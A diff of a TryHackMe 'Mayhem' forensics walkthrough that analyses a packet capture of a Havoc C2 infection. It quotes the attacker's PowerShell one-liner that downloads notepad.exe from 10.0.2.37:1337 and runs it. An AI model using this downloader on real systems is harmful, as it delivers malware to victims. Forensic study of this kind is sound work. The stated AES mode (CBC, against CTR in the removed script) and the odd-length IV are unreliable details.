@@ -7,479 +7,292 @@ date: 2025-05-21
 **Room Link:** https://tryhackme.com/room/mayhemroom
 ![Extract and download files - showing terminal with unzip command and file listing](/images/logo.png)
 
-## Description
-
-> Beneath the tempest's roar, a quiet grace,
-> Mayhem's beauty in a hidden place.
-> Within the chaos, a paradox unfolds,
-> A tale of beauty, in disorder it molds.
->
-> Click on the **Download Task Files** button at the top of this task. You will be provided with an **evidence.zip** file. Extract the zip file's contents and begin your analysis in order to answer the questions.
->
-> **Note:** Some browsers may detect the file as malicious. The zip file is safe to download with md5 of `a7d64354e4b8798cff6e063449c1e64f`. In general, as a security practice, download the zip and analyze the forensic files on a dedicated virtual machine, and not on your host OS. Always handle such files in isolated, controlled, and secure environments.
 
 ---
 
-## Understanding the Challenge - Simple Breakdown
+#### The First Clue: The Pcap File
 
-**What is Mayhem?**
-- You receive a zip file with network traffic captured from an infected computer
-- Your job is to find what happened and answer 5 questions
-- The attacker used a tool called **Havoc C2** to control the infected computer
+Our journey begins after unzipping the challenge file. Inside, we find a single, intriguing item: `traffic.pcapng`. A packet capture! This is where all the juicy evidence is hiding.
 
-**What you need to find:**
-1. The attacker's user account ID (SID)
-2. An IPv6 address used by the attacker
-3. A username and password created for backdoor access
-4. A file path that was accessed
-5. A flag hidden in the files
-
----
-
-## Step 1: Extract and Prepare Files
+My first instinct, like any totally normal person, was to peek inside with a text editor. Hey, don't judge! Sometimes you find interesting plaintext right away.
 
 ```bash
-# Extract the evidence.zip file
-unzip evidence.zip
-
-# List all files to see what we're working with
-ls -la
-
-# You should see something like:
-# - Network traffic capture (PCAP file)
-# - Event logs or system artifacts
+nvim traffic.pcapng
 ```
 
-**What you'll find:**
-- A file containing network traffic (usually named `final.pcapng` or similar)
-- This shows all communication between the attacker's server and the infected computer
-
----
-
-## Step 2: Open Network Traffic in Wireshark
+Before we get too excited, let's do a quick safety check.
 
 ```bash
-# Open the PCAP file with Wireshark
-wireshark final.pcapng &
+❯ lsz
+Permissions Size User   Date Modified Name
+.rwxr-xr-x  305k cilgin 15 Nov  2023   traffic.pcapng
+
+~/Downloads via  v3.13.5
+❯ chmod -x traffic.pcapng
 ```
 
-**What to look for:**
+Woah there! The file has execute permissions? That's a huge no-no for a data file. We wouldn't want to accidentally _run_ our packet capture, would we? That could be the shortest investigation ever. Let's defuse this tiny, insignificant bomb by removing that permission. Safety first!
 
-1. **Two main IP addresses:** 10.0.2.37 and 10.0.2.38
-   - 10.0.2.37 = Attacker's Command & Control Server
-   - 10.0.2.38 = Infected Computer (victim)
+This file is probably from NTFS filesystem.
 
-2. **Three HTTP file transfers** appear in the traffic:
-   - `install.ps1` - PowerShell script
-   - `notepad.exe` - Malware (disguised as Windows notepad)
-   - Another executable file
+Opening the file reveals some surprisingly readable text amongst the binary mess:
 
----
+```text
+$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;$65lmAtnzW8 = New-Object System.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);Start-Process -Filepath $LA4rJgSPpx
 
-## Step 3: Extract Downloaded Files
 
-In Wireshark:
-1. Click menu: **File → Export Objects → HTTP**
-2. You'll see 3 files listed
-3. Save all of them to analyze
 
-**The PowerShell Script (install.ps1):**
+GET /install.ps1 HTTP/1.1
+```
+
+Well, well, what do we have here? It looks like our attacker used a PowerShell script (`install.ps1`) to download a file named `notepad.exe`. That seems... incredibly suspicious.
+
+#### Calling in the Big Guns: Wireshark
+
+Reading a `.pcap` file in a text editor is like trying to read a novel through a keyhole. It's time to fire up the proper tool for the job: **Wireshark**.
+
+Using Wireshark's "Export Objects" feature, we can easily extract the `install.ps1` script and the downloaded `notepad.exe` file.
+
+![Desktop View](/assets/img/2025-07-08-TryHackMe-Mayhem/photo1.webp){: width="972" height="589" }
+
+The `install.ps1` script is a nasty one-liner, just like we saw earlier:
 
 ```powershell
-$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe"
-$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe"
-Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx
-$65lmAtnzW8 = New-Object System.Net.WebClient
-$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx)
-Start-Process -Filepath $LA4rJgSPpx
+$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;$65lmAtnzW8 = New-Object System.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);Start-Process -Filepath $LA4rJgSPpx
 ```
 
-**What it does (in simple terms):**
-- Downloads `notepad.exe` from the attacker's server
-- Saves it to the victim's Downloads folder
-- Runs the downloaded file
-- This launches the malware!
+Now, about that `notepad.exe`... My malware senses are tingling! Let's send it over to VirusTotal for a second opinion.
 
----
+[VirusTotal - File - 99784f28e4e95f044d97e402bbf58f369c7c37f49dc5bf48e6b2e706181db3b7](https://www.virustotal.com/gui/file/99784f28e4e95f044d97e402bbf58f369c7c37f49dc5bf48e6b2e706181db3b7)
 
-## Step 4: Identify the Malware
+![Desktop View](/assets/img/2025-07-08-TryHackMe-Mayhem/photo2.webp){: width="972" height="589" }
 
-Check the MD5 hash of the `notepad.exe` file:
+Bingo! The results are in, and it's lit up like a Christmas tree. VirusTotal confirms our suspicions: this is a malicious payload generated by the **Havoc C2 framework**. Nasty stuff.
+
+[HavocFramework/Havoc: The Havoc Framework](https://github.com/HavocFramework/Havoc)
+
+#### Digging for Strings
+
+VirusTotal is great, but let's do some of our own sleuthing. The `strings` command is a fantastic tool for pulling any readable text out of a binary file. You'd be surprised what secrets you can find.
 
 ```bash
-md5sum notepad.exe
-# Output: a13daa35fd7b873f87379a94b97168e2
+# Let's see what secrets this "notepad" is hiding.
+strings notepad.exe
 ```
 
-Search this hash on **VirusTotal.com** and you'll find:
-- It's flagged as **Havoc C2 malware** by most antivirus engines
-- Havoc is a command & control framework
-- The attacker can now send commands to the infected computer!
-
----
-
-## Step 5: Decrypt the Secret Communication
-
-After the malware runs, the attacker and malware communicate using **encrypted traffic**. To read these messages, we need to:
-
-1. **Find the encryption key** (AES key and IV)
-2. **Decrypt the messages**
-3. **Read what commands were executed**
-
-### The Python Script (Copy and Use This)
-
-Save this as `havoc-parser.py`:
-
-```python
-import os
-import argparse
-import struct
-import binascii
-from binascii import unhexlify
-from uuid import uuid4
-
-try:
-    import pyshark
-except ImportError:
-    print("[-] Pyshark not installed, please install with 'pip install pyshark'")
-    exit(0)
-
-try:
-    from Crypto.Cipher import AES
-    from Crypto.Util import Counter
-except ImportError:
-    print("[-] PyCryptodome not installed, please install with 'pip install pycryptodome'")
-    exit(0)
-
-RED = '\033[91m'
-GREEN = '\033[92m'
-BLUE = '\033[94m'
-RESET = '\033[0m'
-
-demon_constants = {
-    1: "GET_JOB",
-    10: 'COMMAND_NOJOB',
-    11: 'SLEEP',
-    12: 'COMMAND_PROC_LIST',
-    15: 'COMMAND_FS',
-    20: 'COMMAND_INLINEEXECUTE',
-    21: 'COMMAND_JOB',
-    22: 'COMMAND_INJECT_DLL',
-    24: 'COMMAND_INJECT_SHELLCODE',
-    26: 'COMMAND_SPAWNDLL',
-    27: 'COMMAND_PROC_PPIDSPOOF',
-    40: 'COMMAND_TOKEN',
-    99: 'DEMON_INIT',
-    100: 'COMMAND_CHECKIN',
-    2100: 'COMMAND_NET',
-    2500: 'COMMAND_CONFIG',
-    2510: 'COMMAND_SCREENSHOT',
-    2520: 'COMMAND_PIVOT',
-    2530: 'COMMAND_TRANSFER',
-    2540: 'COMMAND_SOCKET',
-    2550: 'COMMAND_KERBEROS',
-    2560: 'COMMAND_MEM_FILE',
-    4112: 'COMMAND_PROC',
-    4113: 'COMMMAND_PS_IMPORT',
-    8193: 'COMMAND_ASSEMBLY_INLINE_EXECUTE',
-    8195: 'COMMAND_ASSEMBLY_LIST_VERSIONS',
-}
-
-sessions = {}
-
-def tsharkbody_to_bytes(hex_string):
-    """Convert hex string to bytes"""
-    hex_string = hex_string.replace(':', '')
-    hex_bytes = unhexlify(hex_string)
-    return hex_bytes
-
-def aes_decrypt_ctr(aes_key, aes_iv, encrypted_payload):
-    """Decrypt AES-CTR encrypted data"""
-    ctr = Counter.new(128, initial_value=int.from_bytes(aes_iv, byteorder='big'))
-    cipher = AES.new(aes_key, AES.MODE_CTR, counter=ctr)
-    decrypted_payload = cipher.decrypt(encrypted_payload)
-    return decrypted_payload
-
-def parse_header(header_bytes):
-    """Parse the 20-byte Havoc header"""
-    if len(header_bytes) != 20:
-        raise ValueError("Header must be exactly 20 bytes long")
-
-    payload_size, magic_bytes, agent_id, command_id, mem_id = struct.unpack('>I4s4sI4s', header_bytes)
-    magic_bytes_str = binascii.hexlify(magic_bytes).decode('ascii')
-    agent_id_str = binascii.hexlify(agent_id).decode('ascii')
-    mem_id_str = binascii.hexlify(mem_id).decode('ascii')
-    command_name = demon_constants.get(command_id, f'Unknown Command ID: {command_id}')
-
-    return {
-        'payload_size': payload_size,
-        'magic_bytes': magic_bytes_str,
-        'agent_id': agent_id_str,
-        'command_id': command_name,
-        'mem_id': mem_id_str
-    }
-
-def parse_request(http_pair, magic_bytes):
-    request = http_pair['request']
-    response = http_pair['response']
-    unique_id = uuid4()
-
-    try:
-        request_body = tsharkbody_to_bytes(request.get('file_data', ''))
-        header_bytes = request_body[:20]
-        request_payload = request_body[20:]
-        request_header = parse_header(header_bytes)
-    except Exception as e:
-        print(f"[!] Error parsing request body: {e}")
-        return
-
-    if request_header.get("magic_bytes", '') != magic_bytes:
-        return
-
-    if request_header['command_id'] == 'DEMON_INIT':
-        print("[+] Found Havoc C2")
-        print(f"  [-] Agent ID: {request_header['agent_id']}")
-        print(f"  [-] Magic Bytes: {request_header['magic_bytes']}")
-        print(f"  [-] C2 Address: {request.get('uri')}")
-
-        aes_key = request_body[20:52]
-        aes_iv = request_body[52:68]
-
-        print(f"  [+] Found AES Key")
-        print(f"    [-] Key: {binascii.hexlify(aes_key).decode('ascii')}")
-        print(f"    [-] IV: {binascii.hexlify(aes_iv).decode('ascii')}")
-
-        if request_header['agent_id'] not in sessions:
-            sessions[request_header['agent_id']] = {
-                "aes_key": aes_key,
-                "aes_iv": aes_iv
-            }
-        
-        response_payload = None
-        request_payload = None
-
-    elif request_header['command_id'] == 'GET_JOB':
-        print("  [+] Job Request from Server to Agent")
-        
-        try:
-            response_body = tsharkbody_to_bytes(response.get('file_data', ''))
-        except Exception as e:
-            print(f"[!] Error parsing request body: {e}")
-            return
-
-        header_bytes = response_body[:12]
-        response_payload = response_body[12:]
-        command_id = struct.unpack('<H', header_bytes[:2])[0]
-        command = demon_constants.get(command_id, f'Unknown Command ID: {command_id}')
-
-        print(f"    [-] C2 Address: {request.get('uri')}")
-        print(f"    [-] Command: {command}")
-
-    else:
-        print(f"  [+] Unknown Command: {request_header['command_id']}")
-
-    aes_keys = sessions.get(request_header['agent_id'], None)
-
-    if not aes_keys:
-        print(f"[!] No AES Keys for Agent with ID {request_header['agent_id']}")
-        return
-    
-    request_payload_res = None
-    response_payload_res = None
-
-    # Decrypt the Request Body
-    if request_payload:
-        print("  [+] Decrypting Request Body")
-        decrypted_request = aes_decrypt_ctr(aes_keys['aes_key'], aes_keys['aes_iv'], request_payload)
-        request_payload_res = decrypted_request[16:-16].decode('ascii', 'ignore')
-        print("="*46+" Result "+"="*46)
-        print(request_payload_res)
-        print("="*100)
-
-    # Decrypt the Response Body
-    if response_payload:
-        print("  [+] Decrypting Response Body")
-        decrytped_response = aes_decrypt_ctr(aes_keys['aes_key'], aes_keys['aes_iv'], response_payload)[12:]
-        response_payload_res = decrytped_response.decode('utf-16le','ignore').split("/c")[1][:-4]
-        print(f"    [-] Command: {GREEN}{response_payload_res}{RESET}")
-    
-    return [request_payload_res, response_payload_res]
-
-def read_pcap_and_get_http_pairs(pcap_file, magic_bytes, save):
-    capture = pyshark.FileCapture(pcap_file, display_filter='http')
-    result = []
-    http_pairs = {}
-    current_stream = None
-    request_data = None
-
-    print("[+] Parsing Packets")
-
-    for packet in capture:
-        try:
-            if current_stream != packet.tcp.stream:
-                current_stream = packet.tcp.stream
-                request_data = None
-
-            if packet:
-                if hasattr(packet.http, 'request_method'):
-                    request_data = {
-                        'method': packet.http.request_method,
-                        'uri': packet.http.request_full_uri,
-                        'headers': packet.http.get_field_value('request_line'),
-                        'file_data': packet.http.file_data if hasattr(packet.http, 'file_data') else None
-                    }
-                elif hasattr(packet.http, 'response_code'):
-                    response_data = {
-                        'code': packet.http.response_code,
-                        'phrase': packet.http.response_phrase,
-                        'headers': packet.http.get_field_value('response_line'),
-                        'file_data': packet.http.file_data if hasattr(packet.http, 'file_data') else None
-                    }
-                    http_pairs[f"{current_stream}_{packet.http.request_in}"] = {
-                        'request': request_data,
-                        'response': response_data
-                    }
-                    response_data['file_data'] = packet.tcp.payload.replace(':', '').split("0d0a0d0a")[1]
-                    
-                    result += parse_request(http_pairs[f"{current_stream}_{packet.http.request_in}"], magic_bytes)
-                    request_data = None
-
-        except Exception as e:
-            pass
-
-    if save:
-        with open(save, 'w') as f:
-            f.write("Output: \n")
-            for l in result:
-                if l:
-                    data = l.replace('\x00', '')
-                    f.write(f"{data}\n")
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='Extract Havoc Traffic from a PCAP')
-
-    parser.add_argument('--pcap', help='Path to pcap file', required=True)
-    parser.add_argument("--aes-key", help="AES key", required=False)
-    parser.add_argument("--aes-iv", help="AES initialization vector", required=False)
-    parser.add_argument("--agent-id", help="Agent ID", required=False)
-    parser.add_argument('--magic', help='Set the magic bytes marker for the Havoc C2 traffic', default='deadbeef', required=False)
-    parser.add_argument('--to-file', help='Save conversation to file', default=False, required=False)
-
-    args = parser.parse_args()
-
-    if any([args.aes_key, args.aes_iv, args.agent_id]) and not all([args.aes_key, args.aes_iv, args.agent_id]):
-        parser.error("[!] If you provide one of 'aes-key', 'aes-iv', or 'agent-id', you must provide all three.")
-    
-    if args.agent_id and args.aes_key and args.aes_iv:
-        sessions[args.agent_id] = {
-            "aes_key": unhexlify(args.aes_key),
-            "aes_iv": unhexlify(args.aes_iv)
-        }
-        print(f"[+] Added session keys for Agent ID {args.agent_id}")
-
-    http_pairs = read_pcap_and_get_http_pairs(args.pcap, args.magic, args.to_file)
+```text
+!This program cannot be run in DOS mode.
+...
+demon.x64.exe
 ```
 
-### How to Use the Script
+After scrolling through what feels like the entire Matrix, one line near the end jumps out: `demon.x64.exe`. That's not a typo! The Havoc C2 framework uses flagship agent named "Demon". This all but confirms we're on the right track.
 
-First, install required tools:
+#### The Keys to the Kingdom
+
+A bit of research (shoutout to this great [Immersive Labs article](https://www.immersivelabs.com/resources/blog/havoc-c2-framework-a-defensive-operators-guide)!) tells us that Havoc uses a "magic byte" sequence, `0xDEADBEEF`, to mark the start of its encrypted communication setup. It's like a secret knock. If we can find this knock in our packet capture, the keys to the kingdom (or at least, the encryption keys) should be right next to it.
+
+I searched for these magic bytes in Wireshark and found them!
+
+![Desktop View](/assets/img/2025-07-08-TryHackMe-Mayhem/photo3.webp){: width="972" height="589" }
+
+By analyzing the bytes immediately following `0xDEADBEEF`, we can extract the AES key and the IV (Initialization Vector).
+
+```text
+AES key: 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
+IV key:  8cd00c3e349290565aaa5a8c3aacd43
+```
+
+#### Cracking the Code with CyberChef
+
+Now that we have our keys, we need the encrypted data. The C2 communication happens over HTTP POST requests. We can use `tshark`, the command-line cousin of Wireshark, to filter our capture and extract just the data from these requests.
 
 ```bash
-# Install Python libraries
-pip3 install pyshark pycryptodome
-
-# If on Linux, install tshark
-sudo apt install tshark
+# This command isolates all the POST request media types from the pcap
+tshark -r traffic.pcapng -Y 'http.request.method == "POST"' -T fields -e media.type
 ```
 
-Run the script:
+With our encrypted data blobs and our AES/IV keys in hand, we head over to the digital swiss-army-knife for data manipulation: **[CyberChef](https://gchq.github.io/CyberChef/)**.
+
+The recipe is simple:
+
+1.  Input the encrypted data.
+2.  Use the "From Hex" operation.
+3.  Use the "AES Decrypt" operation, plugging in our extracted Key and IV. Make sure the mode is set to CBC.
+
+![Desktop View](/assets/img/2025-07-08-TryHackMe-Mayhem/photo4.webp){: width="972" height="589" }
+
+![Desktop View](/assets/img/2025-07-08-TryHackMe-Mayhem/photo5.webp){: width="972" height="589" }
+
+_A quick side note: The raw decrypted output was a bit messy, so I used some Vim magic to clean it up for presentation. I could have written a Python script but i wanted do the work myself since there is not that much data._
 
 ```bash
-python3 havoc-parser.py --pcap final.pcapng --to-file commands.txt
+# This command isolates all the POST request media types from the pcap
+tshark -r traffic.pcapng -Y 'http.request.method == "POST"' -T fields -e media.type | nvim
+
 ```
 
-**The script will output:**
-- Agent ID
-- Magic Bytes (`deadbeef`)
-- AES encryption key
-- AES IV (initialization vector)
-- **All decrypted commands sent to the malware!**
-
----
-
-## Step 6: Find the Answers
-
-### Question 1: SID of the Attacker's User Account
-
-**Where to find it:** In the decrypted commands output or Windows Event Logs
-
-The SID looks like: `S-1-5-21-...`
-
-Look for command outputs that show user account information.
-
-### Question 2: Link-Local IPv6 Address
-
-**Where to find it:** In the network traffic or from the malware's configuration
-
-IPv6 Link-Local addresses start with: `fe80::`
-
-Look for IPv6 addresses in the traffic or in network configuration commands.
-
-### Question 3: New Account Created (Username and Password)
-
-**Where to find it:** In the decrypted commands
-
-Look for PowerShell commands like:
-```powershell
-New-LocalUser -Name "username" -Password "password"
+```vim
+:%s/00000010deadbeef0e9fb7d80000000100000000/
 ```
 
-### Question 4: Important File Path
-
-**Where to find it:** In file system commands within the traffic
-
-Look for paths like `C:\Users\...` or file operations in the decrypted output.
-
-### Question 5: Flag
-
-**Where to find it:** Inside the file from Question 4 or in the memory/artifacts
-
-The flag is usually in format: `flag{...}`
-
----
-
-## Quick Command Reference
-
-```bash
-# View network traffic with Wireshark
-wireshark final.pcapng
-
-# Extract files from PCAP
-# (In Wireshark: File → Export Objects → HTTP)
-
-# Check file hash
-md5sum notepad.exe
-
-# Run the decryption script
-python3 havoc-parser.py --pcap final.pcapng --to-file output.txt
-
-# View decrypted commands
-cat output.txt
+```vim
+# And some more to handle the data format
+/3a
+ctrl-v
+select all
+n
+d
 ```
 
+#### The Loot: What the Attacker Saw
+
+After decrypting all the POST data blobs, we get a treasure trove of information. The attacker was busy! Here's the some of the data i gained.
+
+> ```text
+> Host Name:                 WIN-9H86M71MBE9
+> OS Name:                   Microsoft Windows Server 2019 Standard Evaluation
+> OS Version:                10.0.17763 N/A Build 17763
+> OS Manufacturer:           Microsoft Corporation
+> OS Configuration:          Primary Domain Controller
+> OS Build Type:             Multiprocessor Free
+> Registered Owner:          Windows User
+> Registered Organization:
+> Product ID:                00431-10000-00000-AA311
+> Original Install Date:     11/14/2023, 7:36:09 PM
+> System Boot Time:          11/14/2023, 7:55:55 PM
+> System Manufacturer:       innotek GmbH
+> System Model:              VirtualBox
+> System Type:               x64-based PC
+> Processor(s):              1 Processor(s) Installed.
+>                            [01]: Intel64 Family 6 Model 158 Stepping 13 GenuineIntel ~3600 Mhz
+> BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
+> Windows Directory:         C:\Windows
+> System Directory:          C:\Windows\system32
+> Boot Device:               \Device\HarddiskVolume1
+> System Locale:             en-us;English (United States)
+> Input Locale:              en-us;English (United States)
+> Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+> Total Physical Memory:     8,192 MB
+> Available Physical Memory: 6,352 MB
+> Virtual Memory: Max Size:  10,112 MB
+> Virtual Memory: Available: 8,376 MB
+> Virtual Memory: In Use:    1,736 MB
+> Page File Location(s):     C:\pagefile.sys
+> Domain:                    clientserver.thm
+> Logon Server:              \\WIN-9H86M71MBE9
+> Hotfix(s):                 3 Hotfix(s) Installed.
+>                            [01]: KB5020627
+>                            [02]: KB5019966
+>                            [03]: KB5020374
+> Network Card(s):           1 NIC(s) Installed.
+>                            [01]: Intel(R) PRO/1000 MT Desktop Adapter
+>                                  Connection Name: Ethernet
+>                                  DHCP Enabled:    Yes
+>                                  DHCP Server:     10.0.2.3
+>                                  IP address(es)
+>                                  [01]: 10.0.2.38
+>                                  [02]: ***********************
+> Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+> ```
+
+> ```text
+> UserName		SID
+> ====================== ====================================
+> CLIENTSERVER\paco	*******************************************
+>
+>
+> GROUP INFORMATION                                 Type                     SID                                          Attributes
+> ================================================= ===================== ============================================= ==================================================
+> CLIENTSERVER\Domain Users                         Group                    S-1-5-21-679395392-3966376528-1349639417-513  Mandatory group, Enabled by default, Enabled group,
+> Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,
+> BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner,
+> BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group,
+> BUILTIN\Pre-Windows 2000 Compatible Access        Alias                    S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group,
+> NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group,
+> CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group,
+> NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,
+> NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group,
+> LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group,
+> Authentication authority asserted identity        Well-known group         S-1-18-1                                      Mandatory group, Enabled by default, Enabled group,
+> Mandatory Label\High Mandatory Level              Label                    S-1-16-12288                                  Mandatory group, Enabled by default, Enabled group,
+>
+>
+> Privilege Name                Description                                       State
+> ============================= ================================================= ===========================
+> SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled
+> SeMachineAccountPrivilege     Add workstations to domain                        Disabled
+> SeSecurityPrivilege           Manage auditing and security log                  Disabled
+> SeTakeOwnershipPrivilege      Take ownership of files or other objects          Disabled
+> SeLoadDriverPrivilege         Load and unload device drivers                    Disabled
+> SeSystemProfilePrivilege      Profile system performance                        Disabled
+> SeSystemtimePrivilege         Change the system time                            Disabled
+> SeProfileSingleProcessPrivilegeProfile single process                            Disabled
+> SeIncreaseBasePriorityPrivilegeIncrease scheduling priority                      Disabled
+> SeCreatePagefilePrivilege     Create a pagefile                                 Disabled
+> SeBackupPrivilege             Back up files and directories                     Disabled
+> SeRestorePrivilege            Restore files and directories                     Disabled
+> SeShutdownPrivilege           Shut down the system                              Disabled
+> SeDebugPrivilege              Debug programs                                    Enabled
+> SeSystemEnvironmentPrivilege  Modify firmware environment values                Disabled
+> SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled
+> SeRemoteShutdownPrivilege     Force shutdown from a remote system               Disabled
+> SeUndockPrivilege             Remove computer from docking station              Disabled
+> SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegationDisabled
+> SeManageVolumePrivilege       Perform volume maintenance tasks                  Disabled
+> SeImpersonatePrivilege        Impersonate a client after authentication         Enabled
+> SeCreateGlobalPrivilege       Create global objects                             Enabled
+> SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
+> SeTimeZonePrivilege           Change the time zone                              Disabled
+> SeCreateSymbolicLinkPrivilege Create symbolic links                             Disabled
+> SeDelegateSessionUserImpersonatePrivilegeObtain an impersonation token for another user in the same sessionDisabled
+> ```
+
+> ```text
+> Volume in drive C has no label.
+>  Volume Serial Number is D284-F445
+>
+>  Directory of C:\******\****
+>
+> 11/14/2023  08:12 PM    <DIR>          .
+> 11/14/2023  08:12 PM    <DIR>          ..
+> 11/14/2023  08:04 PM    <DIR>          Files
+>                0 File(s)              0 bytes
+>                3 Dir(s)  94,010,191,872 bytes free
+> ```
+
+> ```text
+>  Volume in drive C has no label.
+>  Volume Serial Number is D284-F445
+>
+>  Directory of C:\*****\****\****
+>
+> 11/14/2023  08:14 PM    <DIR>          .
+> 11/14/2023  08:14 PM    <DIR>          ..
+> 11/14/2023  08:14 PM               555 clients.csv
+>                1 File(s)            555 bytes
+>                2 Dir(s)  94,010,060,800 bytes free
+> ```
+
+> ```text
+> THM{*****************************}
+> ```
+
+> ```text
+> Windows IP Configuration
+>
+>
+> Ethernet adapter Ethernet:
+>
+>    Connection-specific DNS Suffix  . : home
+>    Link-local IPv6 Address . . . . . : **************************
+>    IPv4 Address. . . . . . . . . . . : 10.0.2.38
+>    Subnet Mask . . . . . . . . . . . : 255.255.255.0
+>    Default Gateway . . . . . . . . . : 10.0.2.1
+> ```
+
 ---
 
-## Key Concepts
+Now it's your turn! Decrypt the data and answer the questions.
 
-**Havoc C2:** A tool attackers use to control infected computers remotely (like a backdoor)
-
-**AES Encryption:** The cipher used to hide commands from security analysts
-
-**Magic Bytes (0xDEADBEEF):** A signature that identifies Havoc traffic
-
-**PCAP:** A file containing captured network traffic
-
-**Decryption:** Using the AES key and IV to read encrypted messages
-
----
-
+And there we have it. Hope you enjoyed the walkthrough!
